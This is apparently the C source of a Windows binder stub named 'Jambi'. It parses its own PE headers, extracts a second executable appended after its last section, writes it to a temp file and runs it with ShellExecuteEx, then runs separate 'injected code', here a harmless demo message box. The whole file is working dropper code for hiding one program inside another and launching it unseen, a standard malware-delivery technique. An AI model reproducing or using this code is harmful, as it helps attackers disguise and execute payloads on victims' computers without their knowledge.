#include <windows.h>
#include <tchar.h>
#include "utils.h"

int cleanup(buffer_t** buff, HANDLE han) {
  if (buff != NULL)
    buffer_destroy(buff);
  if (han != INVALID_HANDLE_VALUE)
    CloseHandle(han);
  return 1;
}

int bailOut(const char* str, buffer_t** buff, HANDLE han) {
  printf("\t[-] %s\n", str);
  return cleanup(buff, han);
}

int main(/*int ac, char** av*/) {
  char _stringBuff_buff[MAX_PATH];
  String stringBuff;
  buffer_t* buff = NULL;
  stringBuff.ptr = &(_stringBuff_buff[0]);

  // Open current file
  getFilePath(&stringBuff);
  buff = readFileToFileBuffer(stringBuff.ptr);
  if (buff == NULL)
    return bailOut("Cannot read current file.", &buff, INVALID_HANDLE_VALUE);

  // Create temp file
  getFileName(&stringBuff);
  HANDLE hTemp = createTempFile(stringBuff.ptr);
  if (hTemp == INVALID_HANDLE_VALUE)
    return bailOut("Unable to open temp file.", &buff, hTemp);

  // Get end of this file.
  // This is copy-pasta to/from main.c.
  size_t minSize;
  PeHeader* h = getPEHeader(buff, &minSize);
  if (h == NULL) return cleanup(&buff, hTemp);
  // Get the type of the binary.
  //PeOptHeader32* optH32 = (PeOptHeader32*)(h + 1);
  //PeOptHeader64* optH64 = (PeOptHeader64*)(h + 1);
  //int is64Bits = (optH32->Magic == OPT_HEADER_MAGIC64);
  // Get the data directories
  DataDir* dataDir = NULL;
  uint32_t dataDirLen = getDataDir(buff, h, &dataDir, &minSize);
  if (dataDirLen == 0 || dataDir == NULL) return cleanup(&buff, hTemp);
  // Get the last section
  SectionHeader* firstSection = (SectionHeader*)(dataDir + dataDirLen);
  SectionHeader* lastSection = firstSection + (h->NumberOfSections - 1);
  minSize += sizeof(SectionHeader) * (h->NumberOfSections - 1);
  if (buff->len < minSize)
    return bailOut("Corrupted file (too small for sections).", &buff, hTemp);

  // Get the size of this exe...
  uint32_t fileSize = getExeSize(firstSection, lastSection);
  printf("\t[I] File size is: %d -- Real: %d\n", fileSize, buff->len);
  if ((fileSize + sizeof(DosHeader)) >= buff->len)
    return bailOut("Jambi shellcode doesn't contain binary ?", &buff, hTemp);
  DosHeader* secondHeader = (DosHeader*)(buff->buf + fileSize);
  if (secondHeader->e_magic != MSDOS_MAGIC)
    return bailOut("MSDOS magic not found (MZ)", &buff, hTemp);
  if ((buff->len + sizeof(DosHeader) + secondHeader->e_lfanew + sizeof(PeHeader)) <= fileSize)
    return bailOut("Garbage at the end of shellcode (data too small)", &buff, hTemp);
  PeHeader* h2 = (PeHeader*)((uint8_t*)(secondHeader) + secondHeader->e_lfanew);
  if (h2->Magic != PE_MAGIC)
    return bailOut("PE magic not found (PE)", &buff, hTemp);

  // Write and exec file.
  DWORD bytesWritten;
  if (!WriteFile(hTemp, buff->buf + fileSize, buff->len - fileSize, &bytesWritten, NULL))
    return bailOut("Unable to write to file.", &buff, hTemp);

  printf("\t[I] Written %ld bytes to the file, provided length=%d\n",
	 bytesWritten, buff->len - fileSize);
  buffer_destroy(&buff);
  CloseHandle(hTemp);

  // Run code
  SHELLEXECUTEINFO shExecInfo;
  shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
  shExecInfo.fMask = NULL;
  shExecInfo.hwnd = NULL;
  shExecInfo.lpVerb = NULL;
  shExecInfo.lpFile = stringBuff.ptr;
  shExecInfo.lpParameters = NULL; // TODO: Pass av
  shExecInfo.lpDirectory = NULL;
  shExecInfo.nShow = SW_NORMAL;
  shExecInfo.hInstApp = NULL;
  if (!ShellExecuteEx(&shExecInfo))
    return printf("[-] Error creating process: %ld\n", GetLastError());
  
  ///////////////////
  // Injected code //
  ///////////////////
  MessageBoxA(NULL, "Hello world, I hope you will like this method!", "Jambi", MB_OK);
  
  // Should wait & delete
  return 0;
}
